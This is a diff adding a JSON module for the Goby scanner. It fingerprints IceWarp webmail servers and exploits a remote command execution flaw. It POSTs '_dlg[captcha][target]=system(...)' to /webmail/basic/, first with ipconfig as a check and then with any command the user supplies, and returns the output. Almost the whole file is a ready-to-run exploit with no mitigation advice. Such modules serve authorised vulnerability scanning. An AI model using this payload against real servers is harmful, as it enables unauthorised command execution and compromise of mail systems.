@@ -1,0 +1,91 @@
+{
+      "Name": "IceWarp WebClient basic RCE",
+      "Level": "3",
+      "Tags": [
+            "rce"
+      ],
+      "GobyQuery": "body=\"Powered by IceWarp\"",
+      "Description": "IceWarp",
+      "Product": "IceWarp",
+      "Homepage": "http://www.icewarp.cn/",
+      "Author": "",
+      "Impact": "IceWarp WebClient basic RCE",
+      "Recommendation": "",
+      "References": [
+            "https://www.pwnwiki.org/index.php?title=IceWarp_WebClient_basic_%E9%81%A0%E7%A8%8B%E5%91%BD%E4%BB%A4%E5%9F%B7%E8%A1%8C%E6%BC%8F%E6%B4%9E"
+      ],
+      "HasExp": true,
+      "ExpParams": [
+            {
+                  "Name": "cmd",
+                  "Type": "input",
+                  "Value": "ipconfig"
+            }
+      ],
+      "ExpTips": {
+            "Type": "",
+            "Content": ""
+      },
+      "ScanSteps": [
+            "AND",
+            {
+                  "Request": {
+                        "method": "POST",
+                        "uri": "/webmail/basic/",
+                        "follow_redirect": false,
+                        "header": {
+                              "Content-Type": "application/x-www-form-urlencoded"
+                        },
+                        "data_type": "text",
+                        "data": "_dlg[captcha][target]=system(\\'ipconfig\\')\\"
+                  },
+                  "ResponseTest": {
+                        "type": "group",
+                        "operation": "AND",
+                        "checks": [
+                              {
+                                    "type": "item",
+                                    "variable": "$body",
+                                    "operation": "contains",
+                                    "value": "Windows IP",
+                                    "bz": ""
+                              }
+                        ]
+                  },
+                  "SetVariable": []
+            }
+      ],
+      "ExploitSteps": [
+            "AND",
+            {
+                  "Request": {
+                        "method": "POST",
+                        "uri": "/webmail/basic/",
+                        "follow_redirect": false,
+                        "header": {
+                              "Content-Type": "application/x-www-form-urlencoded"
+                        },
+                        "data_type": "text",
+                        "data": "_dlg[captcha][target]=system(\\'{{{cmd}}}\\')\\"
+                  },
+                  "ResponseTest": {
+                        "type": "group",
+                        "operation": "AND",
+                        "checks": [
+                              {
+                                    "type": "item",
+                                    "variable": "$body",
+                                    "operation": "contains",
+                                    "value": "Windows IP",
+                                    "bz": ""
+                              }
+                        ]
+                  },
+                  "SetVariable": [
+                        "output|lastbody|undefined|undefined"
+                  ]
+            }
+      ],
+      "PostTime": "0000-00-00 00:00:00",
+      "GobyVersion": "0.0.0"
+}
